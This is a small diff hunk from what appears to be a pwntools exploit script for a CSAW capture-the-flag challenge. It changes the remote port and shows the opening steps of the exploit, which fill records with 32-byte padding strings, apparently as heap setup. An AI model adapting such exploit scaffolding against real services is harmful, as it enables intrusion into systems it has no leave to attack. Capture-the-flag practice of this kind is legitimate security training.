@@ -38,7 +38,7 @@ def edit_robot(p, index, newid, age):
     p.sendlineafter("age?\n", str(age))
 
 def main():
-    p = remote("pwn.red.csaw.io", "8000")
+    p = remote("pwn.red.csaw.io", "5008")
 
     add_human(p, "A"*32, 20)
     add_human(p, "B"*32, 20)
